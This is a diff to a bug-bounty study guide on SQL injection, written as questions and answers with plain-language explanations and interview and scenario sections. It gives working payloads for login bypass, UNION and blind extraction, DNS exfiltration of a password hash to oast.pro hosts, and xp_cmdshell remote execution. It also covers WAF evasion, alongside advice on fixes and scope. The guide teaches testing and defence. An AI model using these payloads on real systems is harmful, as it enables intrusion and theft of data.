@@ -1,5 +1,7 @@
 # SQL Injection — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)
 
+**Author:** x8bitranjit
+
 > A complete, in-depth study + field reference for **SQL injection** — from "what is it" to RCE on the DB host,
 > authentication bypass, full database dump, file read/write, blind char-by-char extraction, out-of-band exfiltration,
 > stacked queries, second-order, per-DBMS deep dives, WAF evasion, tooling, methodology, real-world cases, **and**
@@ -45,8 +47,12 @@
 ### Q1. What is SQL injection?
 A flaw where user input is incorporated into a SQL statement **as code rather than data** — the application string-builds the query instead of using a **parameterized query / prepared statement**. By injecting SQL syntax, the attacker changes what the query does: read other rows/tables, make a condition always-true (auth bypass), call DBMS functions (read files, sleep, run OS commands), or append extra statements. It is **CWE-89**, the canonical member of the injection family (CWE-74).
 
+> *Plain version:* the app talks to the database by **speaking a sentence** ("bring me the row WHERE id = '5'"), and your input is meant to be a **quoted word** in that sentence — just data. SQL injection is breaking out of the quotes so your text becomes part of the *sentence's grammar* instead of a word — now you're giving the database orders, not filling in a blank.
+
 ### Q2. Why is SQLi considered the "flagship" web vulnerability?
 Because its impact ceiling is the highest of the common web bugs. A single injectable parameter can yield: a full database dump (credentials, PII, secrets), **authentication bypass → admin takeover**, arbitrary **file read** and **file write** on the server, and — with a privileged DB account on MSSQL/PostgreSQL/MySQL — **remote code execution on the database host**. Few other web bugs chain from one request to total server compromise.
+
+> *Plain version:* once you can write the database's sentences, there's almost no limit — you can tell it "read me every password," "let me in as admin," "hand me that file off the disk," or on some setups "run this command on your server." One broken blank in one form can cascade to owning the whole box. That's why it's the perennial #1.
 
 ### Q3. How is SQLi different from command injection, LDAP injection, SSTI, NoSQLi?
 All are "untrusted input in an interpreter," but the interpreter differs. **SQLi** targets a SQL database (read/write data, sometimes RCE via DB features). **Command injection** runs OS commands directly (`;id;`). **LDAP injection** edits a directory filter (auth/authz, no RCE). **SSTI** abuses a template engine (`${7*7}`→49, often RCE). **NoSQL injection** abuses document-store operators (`$ne`, `$gt`, `$where`). Same mindset, different syntax and ceiling — route each to its own kit.
@@ -59,17 +65,23 @@ All are "untrusted input in an interpreter," but the interpreter differs. **SQLi
 5. **Out-of-band (OOB)** — no in-band channel; force the DB to make a DNS/HTTP request carrying the data to you.
 (Plus **stacked queries**: append `; <statement>` for INSERT/UPDATE/EXEC — driver-dependent.)
 
+> *Plain version:* five ways the database can answer you, best-to-worst. **Error** = it prints its mistakes, and you sneak your data into the error text. **UNION** = the page shows results, so you bolt "...and also the passwords" onto them. **Boolean** = no data shown, but true-vs-false makes the page look subtly different — a yes/no light you read one bit at a time. **Time** = even the page is identical, but you make it *pause 5 seconds* for "yes" and read answers off the clock. **OOB** = it tells you nothing, so you make it phone your server with the data in the address. You only need *one* to win.
+
 ### Q5. What are the three injection contexts, and why do they matter?
 - **String** (`…name='INPUT'`): break out with a quote (`'`), then comment or balance.
 - **Numeric** (`…id=INPUT`): no quote to close — inject directly (`1 OR 1=1`, `1 AND SLEEP(5)`).
 - **Identifier** (`…ORDER BY INPUT` / column/table name): quotes don't help; use a column index, a `CASE`, or a subquery.
 The context decides the break-out. A string payload does nothing in a numeric slot, and **no** quote payload works in an identifier slot — getting the context right *before* spraying is the single biggest time-saver.
 
+> *Plain version:* *where your word sits* decides which tool opens it. Wrapped in quotes (`'INPUT'`) → you need a `'` to pry it open (string). A bare number (`id=INPUT`) → no quotes to open, just start writing (numeric). Naming a column (`ORDER BY INPUT`) → there's no quote at all, so `'` is useless and you need entirely different tricks (identifier). Firing quote-payloads at a numeric or identifier slot and getting nothing is the classic "I concluded it's safe when it wasn't" mistake — nail the context first.
+
 ### Q6. Why must I fingerprint the DBMS, and how?
 Because every exploitation primitive is dialect-specific: `@@version` vs `version()` vs `banner`; `CONCAT` vs `||` vs `+`; `SLEEP()` vs `pg_sleep()` vs `WAITFOR DELAY` vs `dbms_pipe.receive_message`. Fingerprint from **error text** (MySQL "check the manual", MSSQL "Unclosed quotation mark", Oracle "ORA-#####", PG "syntax error at or near"), from **which concat/sleep works**, and from behavior (Oracle needs `FROM dual`). Get the engine right and the whole arsenal becomes copy-paste.
 
 ### Q7. What's the single most important mindset?
 **Prove the database did something different because of your input — not that a character was reflected or that you got a 500.** The bug exists only when the *query* behaves differently: other rows returned, a TRUE/FALSE branch, a controlled time delay, a UNION value on the page, a value leaked via error, or an OOB callback. A reflected SQL error is, at most, a lead.
+
+> *Plain version:* an error page just proves your input *reached* the sentence — it doesn't prove you can *rewrite* it. The finding is showing the database **obeyed you**: it returned different rows, branched true/false, paused on command, showed you a version string, or phoned home. "It threw a 500 on a quote" is a lead to chase, never the finding itself.
 
 ### Q8. Why is "I got a 500 / a SQL error" not automatically a finding?
 A crash or a verbose error proves your input *reached* the query, but not that you can *control* it. Triagers reject "the page errors on a quote" without a demonstrated query change. A verbose error is at best a low-severity information leak; turn it into error-based extraction or pivot to boolean/UNION/time to make it a real SQLi.
@@ -102,6 +114,8 @@ If neither (the value names a column), it's **identifier** context — use index
 
 ### Q14. What is the arithmetic test and why is it elegant?
 For a numeric parameter, send `id=2-1` (or `id=3-2`). If you get the **same row as `id=1`**, the database evaluated the subtraction server-side — proving your input is parsed as SQL, not treated as the literal string "2-1". It's a clean, low-noise confirmation of numeric injection that throws no error and dumps no data.
+
+> *Plain version:* a beautifully quiet test. If your input is treated as a plain word, `2-1` is just the text "2-1" and finds nothing. But if the database *does the subtraction* and hands you row 1, that only happens because it's reading your input as **math it should compute** — i.e. as grammar, not data. So the same row coming back for `2-1` and `1` silently proves injection, with no error and no data touched. Perfect for numeric slots that never throw an error.
 
 ### Q15. What is error-based SQLi and what does the error give me?
 When the DB error is shown, you can (a) **fingerprint** the engine and (b) **extract data into the error** using functions that embed a subquery's result in the error text — MySQL `extractvalue/updatexml`, MSSQL `CONVERT(int,(subquery))`, PostgreSQL `CAST(... AS int)`, Oracle `UTL_INADDR`/`CTXSYS.DRITHSX.SN`. A single `extractvalue(1,concat(0x7e,(SELECT @@version)))` returns the version inside an "XPATH syntax error" — clean, decisive proof.
@@ -149,11 +163,17 @@ Concatenate. Put multiple values into the single visible string column: MySQL `C
 ### Q26. How do I exploit an `ORDER BY` / identifier context with no quotes?
 Three routes: (1) **Column index** — `?sort=1` vs `?sort=2` reorder differently (and brute the count). (2) **Boolean via CASE** — `?sort=(CASE WHEN (1=1) THEN name ELSE id END)` gives ordering A vs B → a quote-free boolean oracle. (3) **Time via subquery** (MySQL) — `?sort=(SELECT 1 FROM (SELECT SLEEP(5))x)`. The direction slot (`ASC`/`DESC`) is sometimes injectable too.
 
+> *Plain version:* the most-missed SQLi, because `'` genuinely does nothing here — your input is a *column name*, not a quoted value. But you can still smuggle logic in: flip `?sort=1`↔`?sort=2` and watch the order change (proof it's live), or feed a `CASE WHEN (question) THEN ... ELSE ...` so the *ordering itself* answers yes/no, or a `(SELECT SLEEP(5))` to read by the clock. Tons of "safe" apps parameterize their values but paste the **sort column** in raw — so a well-defended app is often wide open right here.
+
 ### Q27. How does boolean-based blind extraction work?
 You have a 1-bit oracle (TRUE vs FALSE → different response). Read a value char-by-char: `SUBSTRING(value,pos,1)='x'`, or faster, `ASCII(SUBSTRING(value,pos,1))>mid` and **binary-search** the ASCII code (~7 requests/char instead of ~95). Get the length first (`LENGTH(value)>N`, binary-searched) so you know when to stop.
 
+> *Plain version:* the page shows no data, but it *reacts* differently to true vs false — a yes/no light bulb. That's all you need: you play 20-questions to spell out any value. Instead of asking "is this letter 'a'? 'b'? 'c'?" (up to 95 guesses), you binary-search — "is its code above 77? above 109?" — halving the range each time, so ~7 questions nail each character. Get the length first so you know where to stop. Tedious but total; `sqli_blind.py` does the guessing for you.
+
 ### Q28. How does time-based blind work when there's no visible difference?
 Make the query **pause** on a condition and read the answer from the response time: `IF(<condition>,SLEEP(5),0)` (MySQL), `CASE WHEN <cond> THEN pg_sleep(5) ELSE 1 END` (PG), `IF (<cond>) WAITFOR DELAY '0:0:5'` (MSSQL), `CASE WHEN <cond> THEN dbms_pipe.receive_message(('a'),5) ELSE 1 END` (Oracle). Delayed ⇒ condition true. Slowest channel, but it works whenever the query runs.
+
+> *Plain version:* when even the yes/no light bulb is gone (the page looks identical either way), you make the database answer with **the clock**: "if my guess is right, wait 5 seconds before replying." Slow reply = right, instant reply = wrong. You read the whole database off response times. It's the slowest channel (every character costs real seconds) but the most universal — it works through a total blackout, and it fingerprints the engine for free since each database spells "pause" differently.
 
 ### Q29. When and why use out-of-band (OOB)?
 When there's no in-band channel (no error, no reflection, no boolean diff) and time-blind is too slow/unstable — or just as a *fast confirmation*. Force the DB to resolve a hostname you control with the stolen data as a subdomain: MSSQL `xp_dirtree '\\…\x'`, Oracle `UTL_INADDR.GET_HOST_ADDRESS`/`DBMS_LDAP`, PostgreSQL `COPY…TO PROGRAM 'nslookup …'`, MySQL `LOAD_FILE('\\\\…')` on Windows. A single DNS hit carrying `database()` is irrefutable.
@@ -219,6 +239,8 @@ MSSQL servers often define **linked servers** (other DB instances). With access 
 
 ### Q47. How does SQLi bypass authentication?
 A login that builds `SELECT * FROM users WHERE user='$u' AND pass='$p'` and treats "row returned" as success is bypassable: comment out the password (`admin'-- -`), or force the WHERE true (`' OR '1'='1'-- -`, `' OR 1=1 LIMIT 1-- -`). You land on a user row without the real password — often the first/admin row.
+
+> *Plain version:* the login sentence asks "is there a user named `___` with password `___`?" and treats "a row came back" as "you're in." Type the username as `admin'-- -` and the `--` turns the whole "AND password = ..." part into an ignored comment — so it only checks "is there a user named admin?" → yes → you're admin, no password. Or `' OR '1'='1` makes the condition always-true so a row *always* comes back. The flaw is trusting "a row exists" instead of actually checking the password.
 
 ### Q48. How do I land on the admin specifically?
 Target the username in the WHERE: `admin'-- -` (comment the password check) or `admin' AND '1'='1'-- -`. If you only get "the first row," `' OR 1=1 LIMIT 1` frequently lands on the first/admin account anyway. Note exactly which account you authenticate as — admin → **Critical**, normal user → High.
@@ -465,6 +487,78 @@ Run the app on a **least-privilege DB account**: no `FILE`/superuser/`sysadmin`/
 
 ### Q110. Give me the defender's one-paragraph summary.
 Treat every value entering SQL as hostile: use **parameterized queries** everywhere so input is always data; for identifiers that can't bind, **allowlist** against known values. Implement login as parameterized lookup + **server-side constant-time hash compare**, never "a row matched." Add input validation and a WAF as **defense-in-depth**, not the main control. Then **minimize blast radius**: a **least-privilege** DB account with no file/superuser/command features, disabled dangerous functions, suppressed verbose errors, and anomaly monitoring. Do that and the entire attack tree here — auth bypass, dump, file R/W, RCE, blind/OOB extraction, stacked and second-order — collapses to a contained, low-value event.
+
+---
+
+# LEVEL 7 — INTERVIEW (explain it out loud)
+
+> Crisp, senior-sounding answers for an AppSec/pentest interview or a bounty-team screen. SQLi is the most-asked web-security topic; these separate "ran sqlmap once" from "understands the query."
+
+### Q111. In one sentence, what is SQL injection and why is it still the scariest web bug?
+SQLi is when attacker input is concatenated into a SQL query so the database parses part of your input as **code, not data** — letting you read/modify the whole database, bypass auth, read/write files, and on many engines **run OS commands**. It's the scariest because it's often **pre-auth, internet-facing, and reaches RCE** (MOVEit 2023 is the poster child), all from one unsanitized parameter.
+
+### Q112. What actually proves SQLi — and what's a false positive?
+Proof = **the query behaved differently because of your input**: other rows returned, a TRUE/FALSE branch flips (`AND 1=1` vs `1=2`), a **controlled** time delay, a UNION value appears, or a DNS callback fires. A **500 or a reflected error alone is NOT proof** — the error could be reflected text with no query change. This "altered query, not reflected error" rule is the #1 thing triagers check and the #1 reason reports get rejected.
+
+### Q113. Name the five detection channels and when you use each.
+**Error-based** (DB errors are shown → extract via error text — fastest); **UNION** (query results are rendered → append a `UNION SELECT`); **Boolean-blind** (only a true/false difference → binary-search each char); **Time-blind** (no visible difference at all → conditional `SLEEP`/`WAITFOR`); **OOB/DNS** (fully blind, no timing → make the DB do a DNS/HTTP callback carrying the data). You pick the *easiest one the target gives you*, in roughly that order.
+
+### Q114. Explain the three injection contexts and why they change your payload.
+**String** (`…WHERE name='INPUT'`) — you must close a quote (`'`) first. **Numeric** (`…WHERE id=INPUT`) — no quote, inject bare (and `id=15-1`→row 14 proves it). **Identifier** (`ORDER BY INPUT`, column/table name) — quotes are useless because it's not a string literal; you inject with index numbers, `CASE`, or subqueries. Same bug, three break-outs — using the wrong one wastes payloads. (Joomla CVE-2017-8917 was an `ORDER BY` context.)
+
+### Q115. Why does the DBMS matter, and how do you fingerprint it?
+The bug is universal but the *dialect* isn't — string concat (`||` vs `+` vs `CONCAT`), comments, the sleep function, and the RCE primitive all differ across MySQL/PostgreSQL/MSSQL/Oracle/SQLite. Fingerprint from the **error text**, the **version banner** (`@@version`/`version()`), which **concat/sleep** syntax works, and system-table names. Get the engine right and the whole arsenal becomes copy-paste; get it wrong and nothing lands.
+
+### Q116. Blind SQLi with no visible output and no timing signal — how do you extract data?
+**Out-of-band.** Make the database perform a **DNS or HTTP callback** to a host you control, with the secret embedded in the subdomain — e.g. MSSQL `xp_dirtree`/PostgreSQL `COPY TO PROGRAM`/Oracle `UTL_HTTP`/MySQL `LOAD_FILE('\\\\<data>.oast.pro\\x')`. A hit on your Collaborator carrying the data proves and exfiltrates in one shot — and OOB is far faster than char-by-char time-blind.
+
+### Q117. How does SQLi become RCE? Give the per-engine primitives.
+**MSSQL**: `EXEC xp_cmdshell 'cmd'` (if sysadmin / re-enabled). **PostgreSQL**: `COPY … FROM PROGRAM 'cmd'` (superuser) or a C/UDF. **MySQL/MariaDB**: `INTO OUTFILE` a webshell into the webroot, or a UDF (`sys_exec`) if `FILE` priv + writable plugin dir. **Oracle**: Java stored procs / `DBMS_SCHEDULER`. All need privilege — which is exactly why a **least-privilege DB account** is the containment control.
+
+### Q118. Boolean-blind vs time-blind — which do you prefer and why?
+**Boolean** when there's *any* visible difference between true and false — it's a clean binary search (~log₂(charset) requests per character) and doesn't depend on network timing. **Time-blind** only when the response is byte-identical either way — it's slower and noisy (each char costs real seconds, and jitter causes errors), so you reserve it for truly blind sinks. Both beat dumping the whole table when you only need proof.
+
+### Q119. What's second-order SQLi, and why do parameterized *reads* not always save you?
+Second-order = your payload is **stored safely** on one request (e.g., a username `admin'-- -`) and later **used unsafely** by a *different* code path that concatenates the stored value into a query (a report, a batch job, an admin view). The initial insert can be perfectly parameterized; the vuln is the *second* query that trusts stored data. It's nasty because it often runs at **higher privilege** and is invisible to a scanner testing one endpoint.
+
+### Q120. sqlmap flagged a parameter. Is that a report?
+No — that's a *lead*. A professional report reproduces it **by hand**: the **context**, the **DBMS**, and a **controlled query change** (version / true-false / delay / DNS), then proves impact benignly (`version()` + one row, or a single `whoami`). Use sqlmap to *confirm and characterize*, never as the whole finding — and never `--dump`/`--risk 3` on production (mass exfil / stacked writes).
+
+### Q121. The single most effective fix, and the one it doesn't cover?
+**Parameterized queries / prepared statements** everywhere — bind variables so input is always data, neutralizing every value-context payload. What it *doesn't* cover: **identifiers** (column/table/sort direction can't be bound) — those you **allowlist** against a fixed set server-side. Escaping and WAFs are defense-in-depth, never the primary control.
+
+### Q122. Rapid fire.
+**`id=15-1` returns row 14?** → numeric SQLi (math evaluated). **Only a 500, no query change?** → not proof, keep probing / don't report. **CWE?** → **CWE-89** (→CWE-78 when it's OS RCE, CWE-287 auth bypass). **Fastest safe proof?** → `@@version` + one row. **`ORDER BY` sink?** → identifier context, no quotes. **NoSQL DB?** → wrong kit, that's the NoSQLi kit. **One param, three channels work?** → one finding, lead with the highest impact.
+
+---
+
+# LEVEL 8 — SCENARIO (walk me through it)
+
+> "Here's the response — what do you do?" End-to-end reasoning from a probe to a proven Critical (or an honest downgrade). Full worked run: guide **Appendix E**.
+
+### Q123. `?id=14'` throws a 500 but `?id=14''` is normal. Is it SQLi? Prove it before reporting.
+Promising (odd vs even quotes changing behavior hints the quote reaches the query) but **not yet proof**. Confirm the query *changed*: `?id=15-1` — if it returns product 14, it's **numeric context** and the DB did math on my input. Then `?id=14 AND 1=1` vs `?id=14 AND 1=2` — if the results flip, that's a boolean oracle = confirmed SQLi. Now I fingerprint the engine from the error and pick a channel. I do **not** report on the 500 alone.
+
+### Q124. Results are rendered on the page and it's MySQL. Walk to a benign proof.
+Visible results → **UNION** is fastest. `ORDER BY N` to find the column count, then `UNION SELECT 1,2,3…` to find a visible/string column. Prove impact minimally: `UNION SELECT 1,@@version,database()-- -` (banner + current DB), then **one** row (`… FROM users LIMIT 1`) — not a dump. That's a complete High/Critical read PoC; I stop there and write it up rather than exfiltrating the table.
+
+### Q125. Response is byte-identical whether the condition is true or false. Extract the admin hash.
+Fully blind → **time or OOB**. Prefer OOB if egress is allowed: make MySQL resolve `LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE id=1),'.oast.pro\\x'))` so the hash arrives in a DNS lookup — one shot, fast. If no egress, fall back to **time-blind binary search**: `AND IF(SUBSTRING((SELECT password…),1,1)>'7',SLEEP(3),0)` and bisect each nibble. Pace it (jitter, low concurrency) because time-blind is loud.
+
+### Q126. You confirmed MSSQL and `IS_SRVROLEMEMBER('sysadmin')` returns 1. Next, safely?
+That's the RCE ceiling. Via a **stacked query**, re-enable and run **one** benign command: `; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';-- -`. If I can't see the output, prove it blind: `xp_cmdshell 'nslookup <user>.oast.pro'` → a DNS hit proves the OS command ran. `nt authority\system` is the Critical. Then I **restore** the `xp_cmdshell` setting, plant nothing, and report — no shell, no data beyond proof.
+
+### Q127. Login form: `admin'-- -` in the username logs you in. What's the impact and the caveats?
+**Auth bypass** — the `'-- -` closed the string and commented out the password check, so the query returned the admin row. Impact is account takeover / admin access (High–Critical depending on the account). Caveats: test against **your own** seeded account where possible (auth-bypass probing can lock real accounts via failed-login counters), confirm you actually landed in an authenticated session (not just a reflected success message), and report the parameterized-lookup + server-side-hash-compare fix.
+
+### Q128. The parameter is a `sort=` that goes into `ORDER BY`. Quotes do nothing. Approach?
+**Identifier context** — you can't close a string because there isn't one. Inject with what `ORDER BY` accepts: `ORDER BY (CASE WHEN (1=1) THEN name ELSE price END)` as a boolean oracle, or `ORDER BY 1,(SELECT ... )`, or a subquery/`IF` that triggers a measurable difference or delay. This is the Joomla CVE-2017-8917 shape. The fix here is an **allowlist** of sortable columns, since binding can't apply.
+
+### Q129. A WAF blocks `UNION SELECT` and `'`. How do you keep going without going loud?
+Confirm the WAF is the blocker (a clean control request passes; the payload 403s), then try **minimal** evasions before heavyweight ones: inline comments (`UNION/**/SELECT`), case/whitespace (`uNiOn`, tabs/newlines), encoding (URL/double-URL, `CHAR()`/hex for strings to avoid quotes), and alternate channels (if UNION is filtered, boolean/time still work). Escalate tampers one at a time (sqlmap `--tamper` minimal first). Loud brute of every tamper script trips rate limits and alerts — surgical beats spray.
+
+### Q130. You have SQLi read access and find a `db_connections`/config table with a cleartext DB DSN and an AWS key. Now what — responsibly?
+Recognize the pivot but stay disciplined. For the report, prove the **read** (one redacted row showing the secret *exists* and its shape) — that's already the impact evidence. Do **not** connect to the other DB, use the AWS key, or dump customer data — that exceeds scope and adds legal risk for zero extra bounty. Note the blast radius (SQLi → leaked infra creds → potential lateral/cloud access) in the writeup, recommend rotating the exposed secret, and hand the *chain* to the program. Restraint is part of a professional PoC (§25 / guide §25).
 
 ---
 
